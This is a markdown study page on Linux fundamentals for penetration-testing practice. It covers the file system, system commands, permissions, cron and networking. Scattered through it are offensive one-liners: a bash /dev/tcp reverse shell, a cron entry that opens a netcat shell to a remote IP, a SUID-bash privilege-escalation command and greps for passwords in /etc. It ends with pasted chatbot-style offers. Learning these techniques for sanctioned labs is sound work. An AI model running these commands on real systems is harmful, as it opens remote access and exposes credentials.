# Linux Fundarmentals
This page documents core Linux fundamentals. 

## Introduction
Linux is the backbone of modern servers, cloud infrastructure, cybersecurity tools, and hacking environments.  
It offers **power, flexibility, automation, and control** via its command-line interface - making it **ideal for pentesting and scripting exploits**.

# Linux Structure
Linux consists of:
* **Kernel** → Manages CPU, memory, processes.
* **Shell** → Interface for user commands.
* **File System** → Stores data & configurations.

# File System Hierarchy
| Directory  | Purpose                                            |
| ---------- | -------------------------------------------------- |
| `/`        | Root of the filesystem                             |
| `/bin`     | Essential binaries                                 |
| `/etc`     | Config files                                       |
| `/var/log` | Logs (good for enumeration)                        |
| `/home`    | User home directories                              |
| `/tmp`     | Temporary files (writeable – useful for exploits!) |
| `/dev`     | Device files                                       |
| `/proc`    | Kernel & process info                              |
![File System Hierarchy](https://www.linuxfoundation.org/hs-fs/hubfs/Imported_Blog_Media/standard-unix-filesystem-hierarchy-1.png?width=1817&height=1001&name=standard-unix-filesystem-hierarchy-1.png)

# Linux Distributions
| Category   | Distros                                     |
| ---------- | ------------------------------------------- |
| Pentesting | Kali, ParrotOS                              |
| Enterprise | RedHat, CentOS, Rocky                       |
| Server     | Debian, Ubuntu Server                       |
| Desktop    | Ubuntu, Linux Mint                          |
| UNIX-based | **Solaris** (often used in legacy systems!) |

identify OS: `hostnamectl`
identify OS: `lsb_release -a`
identify OS: `uname -a`
determine Linux distribution: `cat /etc/*-release`

# 📖 Getting Help
| Command          | Purpose          |
| ---------------- | ---------------- |
| `man <cmd>`      | View manual      |
| `<cmd> --help`   | Get help options |
| `apropos search` | Search manpages  |
Example: `man sudo` or `grep -r "ssh" /usr/share/man/`

# 🖥️ System Information
| Command    | Purpose      |
| ---------- | ------------ |
| `uname -a` | Kernel info  |
| `df -h`    | Disk usage   |
| `free -m`  | Memory usage |
| `lscpu`    | CPU info     |

**Example:**

```bash
cat /proc/version
```

```bash
ps aux | grep root
```

---



### Good Commands
+ ssh [username]@[IP address] - SSH Login  
+ uname -a - Print all information about the machine in a specific order: kernel name, hostname, the kernel release, kernel version, machine hardware name, and operating system.  



```
**Example (privilege escalation enumeration):**

```bash
lsmod          # List kernel modules – find vulnerable ones
```

```bash
sudo -l        # Check if current user can run privileged commands
```
**Example (find passwords):**

```bash
find / -name "*.conf" 2>/dev/null
```

```bash
grep -r "password" /etc/ 2>/dev/null
```
**Example (reverse shell):**

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

```bash
/bin/sh -c 'echo exploited!'
```

---

---



## 📌 Workflow

---

# 📂 Navigation

| Command  | Purpose                 |
| -------- | ----------------------- |
| `pwd`    | Print current directory |
| `cd`     | Change directory        |
| `ls -la` | View files incl. hidden |

**Example:**

```bash
cd ../../etc
```

```bash
ls -la /home/
```

---

# 📄 Working with Files & Directories

**Example:**

```bash
touch exploit.sh
```

```bash
cp /etc/passwd /tmp/pass_backup
```

---

# ✏️ Editing Files

| Tool   | Purpose         |
| ------ | --------------- |
| `nano` | Easy editor     |
| `vim`  | Advanced editor |
| `sed`  | Inline editing  |

**Example:**

```bash
sed -i 's/false/true/' config.txt
```

```bash
echo "bash reverse shell" >> notes.txt
```

---

# 🔍 Find Files & Directories

**Example:**

```bash
find / -name "*.txt" 2>/dev/null
```

```bash
find / -perm -4000 2>/dev/null  # Find SUID binaries
```

---

# 📑 Filter Contents / Regex

```bash
grep -r "password" /etc/
```

```bash
cat file.txt | grep -E "[0-9]{10}"
```

---

# 🔐 Permissions Management

| Command           | Purpose            |
| ----------------- | ------------------ |
| `chmod`           | Change permissions |
| `chown`           | Change ownership   |
| `getfacl/setfacl` | ACL management     |

**Example (priv-esc):**

```bash
chmod +s /bin/bash   # Bad! Enables root shell
```

```bash
find / -writable -type f 2>/dev/null
```

---

## 🧠 System Management

---

# 👥 User Management

```bash
cat /etc/passwd
```

```bash
sudo useradd testuser
```

---

# 📦 Package Management

| Distro        | Tool                |
| ------------- | ------------------- |
| Debian/Ubuntu | `apt`, `dpkg`       |
| RedHat        | `yum`, `dnf`, `rpm` |
| Arch          | `pacman`            |
| Solaris       | `pkgadd`, `pkgrm`   |

**Example:**

```bash
apt install net-tools
```

---

# ⚙️ Service & Process Management

```bash
systemctl status nginx
```

```bash
ps aux | grep root
```

---

# ⏱ Task Scheduling (Cron)

**Example:**

```bash
crontab -l
```

```bash
echo "* * * * * /bin/bash -c 'nc -e /bin/bash 10.10.14.8 4444'" >> cronjob
```

---

# 🌐 Network Services

```bash
ss -tulpn
```

```bash
netstat -ano
```

---

# 💻 Web Services

```bash
curl http://10.10.10.5
```

```bash
python3 -m http.server 80
```

---

# 📦 Backup & Restore

```bash
tar -czvf backup.tar.gz /etc/
```

```bash
rsync -av /src /dest
```

---

# 📁 File System Management

```bash
mount /dev/sda1 /mnt
```

```bash
df -h
```

---

# 📜 System Logs

```bash
journalctl -u ssh
```

```bash
grep "auth" /var/log/*
```

---

# 📉 Monitoring

```bash
top
```

```bash
htop
```

---

## 📦 Containerization (Intro)

| Tool           | Usage               |
| -------------- | ------------------- |
| Docker         | Run isolated apps   |
| Podman         | Rootless containers |
| LXC            | Lightweight VMs     |
| systemd-nspawn | Linux jail-like     |

**Example:**

```bash
docker run -it kalilinux/kali-rolling bash
```

---

## 🌐 Networking – Linux

```bash
ip a
```

```bash
nmcli device status
```

### Remote Desktop Protocols

| Protocol | Tool          |
| -------- | ------------- |
| SSH      | `ssh user@ip` |
| RDP      | `xfreerdp`    |
| VNC      | `vncviewer`   |

---

### 🔥 Firewalls

```bash
ufw status
```

```bash
iptables -L
```

---

# 📋 Linux Cheat Sheet (Quick Reference)

| Command             | Description         |
| ------------------- | ------------------- |
| `man <tool>`        | Opens man pages     |
| `<tool> -h`         | Prints help         |
| `apropos <keyword>` | Search manpages     |
| `whoami`            | Print current user  |
| `id`                | User identity       |
| `uname -a`          | OS info             |
| `hostname`          | Host name           |
| `ifconfig`          | Network config      |
| `netstat`           | Connections         |
| `ss`                | Investigate sockets |
| `lsof`              | List open files     |
| `systemctl`         | Manage services     |
| `kill`              | End process         |
| `curl`              | Transfer data       |
| `wget`              | Download files      |
| `find`              | Search files        |
| `grep`              | Search patterns     |
| `chmod`             | File permissions    |
| `chown`             | Change owner        |

---

Let me know if you'd like:

* **Beginner → Advanced HTB Linux Path**
* **Privilege Escalation Automation Script**
* **PDF printable version**
* **Flashcards for memory training**

🔥 Ready for the next level?

```bash
sudo -l        # Check for privilege escalation vectors
```



